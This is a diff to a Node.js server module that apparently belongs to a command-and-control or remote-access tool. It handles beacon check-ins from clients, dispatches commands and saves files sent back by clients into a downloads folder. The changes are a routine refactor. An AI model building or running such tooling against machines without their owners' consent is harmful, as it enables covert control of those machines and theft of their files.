@@ -1,3 +1,4 @@
+const { join } = require('node:path');
 const { promisify } = require('node:util');
 const { mkdir, writeFile, existsSync } = require('node:fs');
 const { log, logInfo, logError, logSuccess } = require('./logging');
@@ -6,6 +7,7 @@ const { sendClientCommand, showActiveClients, showClient, setClientActive, upser
 const { displayCommandOptions, displayActivePlugins, getUptime } = require('./helpers');
 const { getLoadedPlugins } = require('./plugins');
 const { clearServerConsole, prompt } = require('./readline');
+const { startTime } = require('./server');
 
 require('../typedef/definitions');
 
@@ -14,6 +16,8 @@ const writeFile_promise = promisify(writeFile);
 
 const config = require('./config');
 
+const DOWNLOAD_PATH = join(__dirname, '../', config.path.downloads);
+console.log('download path', DOWNLOAD_PATH);
 /**
  * Beacon handler
  * @param {BeaconResponse} response 
@@ -38,6 +42,8 @@ const handleBeacon = (response, client) => {
             osver: response.osver,
             hostname: response.hostname
         });
+
+        prompt();
     } catch (error) {
         logError(`Error handling download response: ${error.message}`);
     }
@@ -49,13 +55,13 @@ const handleBeacon = (response, client) => {
  */
 const handleDownloadResponse = async (response) => {
     try {
-        if (!existsSync(join(__dirname, config.path.downloads))) {
-            await mkdir_promise(join(__dirname, config.path.downloads));
+        if (!existsSync(DOWNLOAD_PATH)) {
+            await mkdir_promise(DOWNLOAD_PATH);
         }
         const fileName = response.download;
-        const assembledFilePath = join(join(__dirname, config.path.downloads), fileName);
+        const assembledFilePath = join(DOWNLOAD_PATH, fileName);
         await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
-        logSuccess(`\nFile "${fileName}" downloaded successfully to ${join(__dirname, config.path.downloads)}`);
+        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOAD_PATH}`);
     } catch (error) {
         logError(`Error handling download response: ${error.message}`);
     }
@@ -65,7 +71,7 @@ const handleDownloadResponse = async (response) => {
  * Default handler
  * @param {*} response
  */
-const handleResponse = (response) => {
+const handleResponse = async (response) => {
     if (!response) {
         logError("Error: invalid response.");
         return;
@@ -74,7 +80,9 @@ const handleResponse = (response) => {
     if (response.response) {
         response = response.response;
     }
-    if (response.data) {
+    if (response.download) {
+        await handleDownloadResponse(response);
+    } else if (response.data) {
         let data = response.data;
         if (data.type === "Buffer") {
             // handle buffer response
@@ -91,6 +99,7 @@ const handleResponse = (response) => {
     } else if (response.error) {
         logError(response.error);
     }
+    prompt();
 };
 
 /**
